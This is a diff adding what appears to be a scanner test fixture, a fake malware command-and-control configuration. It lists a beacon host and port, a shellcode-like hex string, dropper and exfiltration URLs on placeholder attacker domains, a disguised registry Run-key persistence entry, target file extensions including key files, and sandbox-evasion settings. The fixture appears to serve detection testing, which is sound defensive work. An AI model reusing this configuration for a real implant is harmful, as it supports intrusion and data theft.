@@ -1,0 +1,35 @@
+# Suspicious configuration file
+# Contains patterns that resemble malware C2 configuration
+
+[connection]
+host = 192.168.1.100
+port = 4444
+protocol = tcp
+beacon_interval = 60
+jitter = 0.3
+
+[payload]
+encoded_shellcode = "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151"
+dropper_url = "http://evil-c2.example.com/stage2.bin"
+fallback_url = "http://10.0.0.50:8080/fallback.bin"
+encryption_key = "aes256-cbc:4f6479737365757341492d4d616c7761726554657374"
+
+[persistence]
+method = registry_run
+key = HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+value_name = SecurityUpdate
+autostart = true
+
+[exfiltration]
+upload_url = "https://evil-exfil.example.com/upload"
+max_file_size = 10485760
+target_extensions = .doc,.docx,.pdf,.xls,.xlsx,.pst,.key,.pem
+compress = true
+encrypt = true
+
+[evasion]
+check_sandbox = true
+check_debugger = true
+sandbox_hostnames = SANDBOX,MALWARE,VIRUS,CUCKOO,VMWARE
+sleep_on_detection = 300
+kill_on_detection = false
